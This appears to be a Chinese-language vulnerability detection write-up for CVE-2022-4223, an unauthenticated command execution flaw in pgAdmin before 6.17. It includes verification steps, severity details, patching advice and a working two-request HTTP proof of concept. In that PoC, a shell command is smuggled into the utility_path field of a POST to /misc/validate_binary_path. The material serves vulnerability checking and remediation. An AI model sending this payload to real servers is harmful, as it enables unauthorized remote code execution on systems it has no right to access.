验证漏洞存在方法
    - 发送HTTP GET请求到目标/login端点获取CSRF令牌
    - 发送HTTP POST请求到/misc/validate_binary_path端点，在utility_path参数中注入命令执行payload
    - 检查响应状态码是否为200且包含命令执行结果

漏洞利用方法
    - pgAdmin在6.17版本之前存在不安全的HTTP API，由于访问控制不当，允许未经身份验证的用户通过路径操作执行任意外部实用程序。攻击者可以利用此漏洞在目标服务器上执行任意命令，可能导致远程代码执行或系统被完全控制。
    - PoC:
```http
# 第一步：获取CSRF令牌
GET /login HTTP/1.1
Host: {{Hostname}}

# 第二步：执行命令（示例：执行id命令）
POST /misc/validate_binary_path HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
X-pgA-CSRFToken: {{csrf}}
Referer: {{RootURL}}/browser/

{"utility_path":"/tmp/$(id)"}
```

**漏洞详情**：
- CVE ID: CVE-2022-4223
- CVSS评分: 9.8 (严重)
- 影响版本: pgAdmin < 6.17
- 攻击复杂度: 低
- 所需权限: 无
- 用户交互: 无
- 影响范围: 机密性、完整性、可用性全部受影响

**修复建议**：
- 更新到pgAdmin 6.17或更高版本
- 实施适当的访问控制机制
- 对用户输入进行严格的验证和过滤
